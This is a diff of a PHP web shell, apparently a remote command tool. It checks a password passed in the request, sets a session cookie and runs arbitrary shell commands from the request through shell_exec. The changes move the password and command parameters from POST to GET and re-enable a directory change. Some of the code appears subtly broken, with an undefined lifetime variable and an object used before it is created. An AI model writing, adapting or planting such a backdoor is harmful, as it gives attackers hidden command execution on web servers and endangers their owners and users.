@@ -1,8 +1,6 @@
 <?php
 #Classes
   session_start();
-  session_name("shuffle_id");
-
 	Class System{
 		<password>;		
 		public function get_password(){
@@ -10,28 +8,19 @@
 		}
 	}
 	Class Conect extends System {
-		public function __construct($get,$post){
-			$this->pass = $_POST['pass'];
-		}
-		public function connection(){
-			if(!empty($this->pass)){
-				if($this->pass == $this->get_password() AND $_POST['cmd'] == 'set-connection-to-host'){
-					$hash = md5(date('r', time()));
-					setcookie("shuffle_id",$hash, time() + (86400 * 30), "/");
-					$response =  array('response' => "true",'connection'=> array('cookie' => array("shuffle_id"=> $hash )));
-				}else{
-					$response = array('response' => "false",'msg'=>'Invalid Password');
-				}
-			}else{
-				$response = array('response' => "false",'msg'=>'No method received');
-			}
-			return $response;
+		public function __construct($get){
+			$this->pass = $_GET['pass'];
 		}
 		public function conection(){
-			if($this->pass == $this->get_password()){
-				$response =  array('response' => true);
+			if(!empty($this->pass)){
+				if($this->pass == $this->get_password()){
+					setcookie(session_name(),session_id(),time()+$lifetime);
+					$response =  array('response' => true,'connection'=> array('cookie' => $_COOKIE));
+				}else{
+					$response = array('response' => false,'msg'=>'Invalid Password');
+				}
 			}else{
-				$response = array('response' => false,'msg'=>'Invalid Password');
+				$response = array('response' => false,'msg'=>'No method received');
 			}
 			return $response;
 		}
@@ -53,7 +42,7 @@
 					return 'Directory Not Found';
 				}else{
 					if(!empty(shell_exec($this->cmd))){
-						#chdir($_SESSION['pwd']);
+						chdir($_SESSION['pwd']);
 						return shell_exec($this->cmd);
 					}else{
 						return 'Command Not Found';
@@ -145,17 +134,15 @@
 		}
 	}
 #Class Instance
-if(isset($_POST['cmd'])){
-	if($_POST['cmd'] == "set-connection-to-host"){
+if(isset($_GET['cmd'])){
+	if($_GET['cmd'] == "set-connection-to-host"){
 		$conection = new Conect($_GET,$_POST);
-		$response = $conection->connection();
+		$response = $conection->conection();
 		echo json_encode($response);
 		exit();
 	}
 }
-$conection = new Conect($_GET,$_POST);
-$server = New Server($_POST,$conection->conection());
-
+$server = New Server($_GET,$conection->conection());
 
 		$json = array("response" => "200",
 					  "server_info" => array("user"=>$server->get_user_name(),
